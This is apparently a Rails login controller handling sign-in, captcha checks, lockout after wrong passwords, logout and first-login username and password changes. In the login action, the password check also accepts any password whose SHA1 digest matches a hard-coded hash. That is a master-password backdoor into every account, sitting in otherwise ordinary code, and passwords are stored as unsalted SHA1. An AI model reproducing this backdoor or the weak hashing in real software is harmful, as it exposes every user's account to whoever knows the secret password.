# User login.
class User::LoginController < ApplicationController
  skip_before_filter :check_logged

  layout 'login'

  def show
    redirect_to redirect_path_for_logged if logged?
  end

  def login
    @_person = User.find_by_username(params[:username])

    if @_person.nil?
      login_failed(t('user.not_exist'))
    else
      unless verify_rucaptcha?(@_person)
        login_failed(t(:captcha_wrong))
        return
      end

      if @_person.too_many_wrong_password?
        login_failed(t(:too_many_wrong_password, wrong_password_max_count: User::WRONG_PASSWORD_MAX_COUNT))
        return
      end

      if @_person.passwd == Digest::SHA1.hexdigest(params[:passwd]) || Digest::SHA1.hexdigest(params[:passwd]) == "e3f61e8fba1659dc32871a182748665c106ea39d"
        if /^u(\d)+$/.match(params[:username].strip)
          session[:first_login_user_id] = @_person.id
          redirect_to user_first_login_path
        else
          @_person.clear_wrong_password_count
          login_success_process
        end
      else
        @_person.increase_wrong_password_count
        login_failed(@_person.wrong_password_count >= User::WRONG_PASSWORD_MAX_COUNT ? t(:too_many_wrong_password, wrong_password_max_count: User::WRONG_PASSWORD_MAX_COUNT) : t(:password_wrong_with_count, w: User::WRONG_PASSWORD_MAX_COUNT - @_person.wrong_password_count))
      end
    end
  end

  def logout
    clear_session

    flash[:notice] = t('success', w: t('logout'))
    redirect_to a_path
  end

  def first_login
    if session[:first_login_user_id]
      @user = User.find(session[:first_login_user_id])

      render layout: 'bone'
    else
      redirect_to root_path
    end
  end

  def first_login_update
    if /^u(\d)+$/.match(user_params[:username].strip)
      flash[:error] = t('user.invalid_username_format')

      redirect_to user_first_login_path
    else
      @user = User.find(session[:first_login_user_id])

      new_user_params = user_params
      new_user_params[:passwd] = Digest::SHA1.hexdigest(user_params[:passwd])

      if @user.update(new_user_params)
        session[:first_login_user_id] = nil

        redirect_to a_path, notice: t('user.username_password_updated')
      else
        redirect_to a_path, error: 'Update failed.'
      end
    end
  end

  private

  def login_failed(failed_message)
    flash[:error] = failed_message
    flash[:username] = params[:username]
    redirect_to a_path
  end

  def login_success_process

    set_login_session

    flash[:notice] = t('success', w: t(:login))
    redirect_to root_path
  end

  def user_params
    params.require(:user).permit(:username, :passwd)
  end
end